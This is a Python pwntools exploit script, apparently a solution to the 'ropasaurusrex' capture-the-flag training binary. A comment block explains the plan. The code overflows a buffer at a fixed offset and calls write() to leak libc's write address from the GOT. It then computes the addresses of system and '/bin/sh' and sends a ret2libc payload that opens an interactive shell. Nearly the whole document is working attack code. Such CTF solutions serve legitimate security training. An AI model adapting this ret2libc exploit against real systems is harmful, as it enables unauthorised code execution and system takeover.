from pwn import *

import sys
sys.path.append('../../')
import pwnutil as util

#context.terminal = ['tmux', 'splitw', '-h']
# Connect to remote machine
#r = remote("training.jinblack.it", 2014)

r = process("./ropasaurusrex", env={'LD_PRELOAD': '../../libc-2.27.so'}) 

''' not attaching to remote

gdb.attach(r, """
	
        """)

'''

'''
EXPLANATION
32 bits, NX
There is a buffer overflow, we can overwrite the eip.
We can do a ret2libc but first we need to get the address of system and /bin/sh
What we do is:
	- Overwrite the EIP to call the write() function that is in the binary
		- Use the write function to leak the content of the write slot in the .got.plt, which will have the address of write() in libc.
		- With this address, we can calculate the system and binsh address since the offset is always the same.
	- As the return address from write, we pass the main function address to be able to send another buffer overflow with the calculated addresses
'''

print(r.clean())
input("wait, proceed to leak got")

eip_offset = 140

main_function_address = p32(0x804841d)
write_function_address = p32(0x804830c) # From ghidra, write function in the binary
got_write_entry_address = p32(0x8049614)

#These 2 offsets are from the libc write address, not the binary one
write_system_offset = 0xa9b80 # From gdb, calculate (print write) - (print system)
write_binsh_offset = 0x9734f # From gdb, calculate (print write) - (search /bin/sh)

# return to write (binary) and leak the content of write in the got, which gives us the address of write in libc.
# write(fd, *buff, n) -> fd = 1 (stdout), buff = got_write_address, n = 4 (size of an address)
leak = b'A' * eip_offset + write_function_address + main_function_address + p32(1) + got_write_entry_address + p32(4)

r.send(leak)

input("wait")

libc_write_address = u32(r.clean())


system_address = libc_write_address - write_system_offset
binsh_address = libc_write_address + write_binsh_offset

print('libc write: ' + hex(libc_write_address))
print('libc system: ' + hex(system_address))
print('libc binsh: ' + hex(binsh_address))

input("got leaked, proceed to ret2libc")

ret2libc = b'A' * eip_offset + p32(system_address) + p32(0x0) + p32(binsh_address)

r.send(ret2libc)

input("done!")

r.interactive()
